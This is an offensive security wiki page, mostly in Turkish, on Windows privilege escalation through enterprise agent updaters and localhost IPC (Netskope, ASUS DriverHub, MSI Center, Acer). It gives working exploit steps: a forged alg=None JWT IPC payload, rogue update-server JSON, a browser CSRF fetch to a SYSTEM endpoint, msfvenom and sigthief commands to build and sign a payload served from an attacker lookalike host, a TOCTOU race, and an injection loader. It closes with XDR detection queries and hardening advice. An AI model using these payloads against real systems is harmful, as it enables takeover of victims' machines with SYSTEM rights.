# Kurumsal Otomatik Güncelleyicileri ve Ayrıcalıklı IPC'nin Kötüye Kullanımı (ör. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, kurumsal uç nokta ajanları ve güncelleyicilerde bulunan ve kolay erişimli bir IPC yüzeyi ile ayrıcalıklı bir güncelleme akışı sunan Windows yerel ayrıcalık yükseltme zincirleri sınıfını genelleştirir. Temsili bir örnek, düşük ayrıcalıklı bir kullanıcının kayıt işlemini saldırgan kontrollü bir sunucuya zorlayabildiği ve ardından SYSTEM servisi tarafından yüklenen kötü amaçlı bir MSI teslim edebildiği Netskope Client for Windows < R129 (CVE-2025-0309) durumudur.

Benzer ürünlere karşı yeniden kullanabileceğiniz temel fikirler:
- Bir ayrıcalıklı servisin localhost IPC'sini kötüye kullanarak yeniden kayıt veya yeniden yapılandırmayı saldırgan sunucuya zorlamak.
- Satıcının update endpoint'lerini uygulayın, sahte bir Trusted Root CA teslim edin ve updater'ı kötü amaçlı, "signed" bir pakete yönlendirin.
- Zayıf signer kontrollerini (CN allow-lists), isteğe bağlı digest bayraklarını ve gevşek MSI özelliklerini atlatın.
- Eğer IPC "encrypted" ise, anahtar/IV'yi registry'de saklanan ve tüm dünyadan okunabilen makine tanımlayıcılarından türetin.
- Eğer servis çağıranları image path/process name ile kısıtlıyorsa, allow-listed bir sürece inject edin veya birini suspended durumda spawn ederek minimal bir thread-context patch ile DLL'inizi bootstrap edin.

---
## 1) localhost IPC aracılığıyla kayıt işlemini saldırgan sunucuya zorlamak

Birçok ajan, JSON kullanarak localhost TCP üzerinden SYSTEM servisine konuşan user-mode bir UI süreci ile birlikte gelir.

Netskope'da gözlemlendi:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

İstismar akışı:
1) JWT enrollment token'ı oluşturun; claim'leri backend host'u (ör. AddonUrl) kontrol edecek şekilde ayarlayın. İmza gerektirmemesi için alg=None kullanın.
2) JWT'niz ve tenant adı ile provisioning komutunu çağıran IPC mesajını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için sahte sunucunuza istek göndermeye başlar, örn.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer çağıran doğrulaması yol/isim bazlıysa, isteği allow-listed vendor binary'den başlatın (bkz. §4).

---
## 2) Güncelleme kanalını ele geçirerek kodu SYSTEM olarak çalıştırma

İstemci sunucunuzla iletişim kurduktan sonra, beklenen uç noktaları uygulayın ve onu bir attacker MSI'ye yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → JSON config ile çok kısa bir güncelleme sıklığı döndürün, örn.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA sertifikası döndürür. Hizmet bunu Local Machine Trusted Root store'a kurar.
3) /v2/checkupdate → Malicious bir MSI'yi ve sahte bir sürümü işaret eden metadata sağlar.

Gerçek dünyada görülen yaygın kontrolleri baypas etme:
- Signer CN allow-list: hizmet Subject CN'nin “netSkope Inc” veya “Netskope, Inc.” eşit olup olmadığını kontrol ediyor olabilir. Rogue CA'nız bu CN ile bir leaf sertifika düzenleyip MSI'yi imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI property'si ekleyin. Kurulum sırasında uygulanmıyor.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ekstra kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI'nizi
C:\ProgramData\Netskope\stAgent\data\*.msi
konumundan kurar ve NT AUTHORITY\SYSTEM olarak rastgele kod yürütür.

---
## 3) Forging encrypted IPC requests (when present)

R127'den itibaren, Netskope IPC JSON'ını Base64 benzeri görünen bir encryptData alanına sarmıştı. Tersine mühendislik AES ve key/IV'nin herhangi bir kullanıcı tarafından okunabilen registry değerlerinden türetildiğini gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden üretebilir ve standart bir kullanıcıdan geçerli şifreli komutlar gönderebilir. Genel ipucu: bir agent aniden IPC'sini “encrypt” ediyorsa, HKLM altında device ID'leri, product GUID'leri, install ID'leri gibi materyallere bakın.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Bazı servisler TCP bağlantısının PID'sini çözerek eşi kimlik doğrulamak ve image path/name'i Program Files altında bulunan allow-list'lenmiş vendor binary'lerle karşılaştırmak ister (ör. stagentui.exe, bwansvc.exe, epdlp.exe).

İki pratik baypas:
- DLL injection into an allow-listed process (ör. nsdiag.exe) ve içinden proxy IPC yapmak.
- Allow-listed bir binary'i suspended olarak spawn edip CreateRemoteThread kullanmadan proxy DLL'inizi bootstrap ederek (bkz. §5) driver tarafından uygulanan tamper kurallarını sağlamak.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Ürünler genellikle protected process handle'larından tehlikeli yetkileri kaldırmak için bir minifilter/OB callbacks driver (ör. Stadrv) ile gelir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlama getirir

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) Vendor binary üzerinde CREATE_SUSPENDED ile CreateProcess.
2) Hâlâ alabileceğiniz handle'ları elde edin: process için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve bir thread handle'ı THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya bilinen bir RIP'te kodu patchliyorsanız sadece THREAD_RESUME).
3) ntdll!NtContinue (veya erken, garanti-mapped başka bir thunk) üzerine, DLL path'inizdeki DLL'i LoadLibraryW ile yükleyip sonra geri dönen küçük bir stub yazarak üzerine yazın.
4) ResumeThread ile işlem içindeki stub'ı tetikleyin, böylece DLL'iniz yüklenir.

Zaten korunmuş bir süreçte PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (kendiniz oluşturduğunuz için) driver'ın politikası sağlanmış olur.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI imzalama ve gerekli endpoint'leri sunmayı (/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate) otomatikleştirir.
- UpSkope, isteğe bağlı AES-encrypted olabilen arbitrary IPC mesajları oluşturabilen ve allow-listed bir binary'den originate etmek için suspended-process injection'ı içeren custom bir IPC client'tır.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde browser çağrılarının https://driverhub.asus.com'dan geldiğini bekleyen bir user-mode HTTP servisi (ADU.exe) ile gelir. Origin filtresi Origin header üzerinde ve `/asus/v1.0/*` tarafından sunulan download URL'leri üzerinde `string_contains(".asus.com")` kontrolünü basitçe yapar. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi herhangi bir saldırgan kontrollü host kontrolü geçer ve JavaScript'ten state-değiştirici istekler gönderebilir. Ek bypass kalıpları için bakınız [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md).

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve orada kötü amaçlı bir web sayfası barındırın.
2) `fetch` veya XHR ile `http://127.0.0.1:53000` üzerindeki yetkili bir endpoint'e (ör. `Reboot`, `UpdateApp`) çağrı yapın.
3) Handler'ın beklediği JSON body'yi gönderin — packed frontend JS aşağıdaki şemayı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI, Origin header güvenilen değere taklit edildiğinde bile başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Older WinGUp-based Notepad++ updaters did not fully verify update authenticity. When attackers compromised the hosting provider for the update server, they could tamper with the XML manifest and redirect only chosen clients to attacker URLs. Because the client accepted any HTTPS response without enforcing both a trusted certificate chain and a valid PE signature, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ olmayan bir yükleyiciyi başlatıyor</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu desenler, unsigned manifests kabul eden veya installer signers'ı pin'lemeyen herhangi bir updater'a genellenir — network hijack + malicious installer + BYO-signed sideloading, “trusted” updates kisvesi altında remote code execution ile sonuçlanır.

---
## Kaynaklar
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
